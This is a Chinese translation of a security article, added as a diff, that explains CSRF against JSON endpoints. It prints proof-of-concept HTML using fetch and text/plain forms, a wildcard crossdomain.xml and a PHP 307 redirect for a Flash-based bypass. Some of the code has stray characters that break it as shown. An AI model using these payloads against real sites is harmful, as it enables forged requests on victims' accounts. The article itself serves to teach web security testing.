@@ -1,0 +1,38 @@
+0x00 前言
+CSRF（Cross-site request forgery）跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。
+对于大多数网站，浏览器请求会自动包含任何与网站相关的凭证，例如用户的会话cookie，IP地址，Windows域凭证等等
+大家都知道CSRF攻击，使用burpsuite里自带的增强工具(engagement tools)可以很容易地构造各种基本的CSRF攻击POC，包括通过XHR请求进行的CSRF攻击。
+在这篇文章中，我将要谈论我经常遇到的CSRF场景，并且我将尽可能尝试讲清楚.
+0x01 正文
+接下来的两种方法可以用在使用JSON格式数据进行post请求的情况下.比如{“name”:”test”, “email”:”victim.com”} ,有以下两个场景.
+场景1
+服务器查找json格式的数据，但不验证内容类型
+场景2
+服务器寻找json格式的数据并验证Content-type，也就是application / json
+注意：这个csrf攻击只适用于应用程序只依赖json格式的数据或内容类型的应用程序/ json和数据格式检查，如果有任何额外的csrf标记/ referer检查的地方这将无法正常工作。
+开发案例1：
+只要使用Fetch请求就可以完成，正如我们所知，在这种情况下，服务器只检查发布的数据是否格式正确，如果是，它将接受请求，而不管内容类型是否设置为文本/纯文本
+现在假设我们必须将这个测试数据提交给易受攻击的应用程序：{“name”：“attacker”，“email”：“attacker@gmail.com”}
+更新的方法：
+<html> <title>JSON CSRF POC</title> <body> <center> <h1> JSON CSRF POC </h1> <script> fetch('http://vul-app.com';, {method: 'POST', credentials: 'include', headers: {'Content-Type': 'text/plain'}, body: '{"name":"attacker","email":"attacker.com"}'}); </script> <form action="#"> <input type="button" value="Submit" /> </form> </center> </body> </html>
+资料来源：http://research.rootme.in/forging-content-type-header-with-flash
+以前的方法----使用form：
+使用form构造JSON数据等然后发起post请求：
+html> <title>JSON CSRF POC</title> <center> <h1> JSON CSRF POC </h1> <form action=http://vul-app.com method=post enctype="text/plain" > <input name='{"name":"attacker","email":"attacker@gmail.com","ignore_me":"' value='test"}'type='hidden'> <input type=submit value="Submit"> </form> </center> </html>
+如果应用程序不关心在我看到的大多数情况下发生的额外数据，这将使用有效的json格式的数据发出请求并填充一些额外的数据。如果没有，总是有第二种使用方式。
+资料来源：http://blog.opensecurityresearch.com/2012/02/json-csrf-with-parameter-padding.html
+开发案例2：
+在这里即使应用程序正在验证 内容类型和数据格式，这种攻击也可以使用flash和307重定向来实现。
+要求：
+精心制作的Flash文件 跨域XML文件 带有307个状态的PHP文件 精心制作的flash文件:
+这个flash（.swf）文件有我们的json格式的数据，攻击者必须在目标应用程序上发布，并链接到托管的php文件。
+这里是测试的 SWF文件，你可以根据你的需要下载和编辑内容，我使用FFDec在Windows上进行编辑和编译Flash文件，你可以根据你的环境检查其他人。
+crossdomain XML文件:
+<cross-domain-policy> <allow-access-from domain="*" secure="false"/> <allow-http-request-headers-from domain="*" headers="*" secure="false"/> </cross-domain-policy>
+这个文件应该放在攻击者网站的根目录下，这样Flash文件就可以向攻击者的主机发送请求。
+注意：如果Flash文件＆重定向器页面在同一个域，则不需要crossdomain文件。
+重定向的PHP文件
+<?php // redirect automatically header("Location: https://victim.com/user/endpoint/";, true, 307); ?>
+Flash文件请求这个php文件，这将使307重定向到提到的应用程序端点，并且307是特殊的重定向，它将从Flash文件接收到的JSON数据也post到目标端点，并且CSRF将成功执行.
+注意：因为这是基于闪存的，所以应该在浏览器中安装闪存以使其工作。
+*本文作者Geekboy，淼淼兮与怀翻译，转载请注明来自FreeBuf.COM
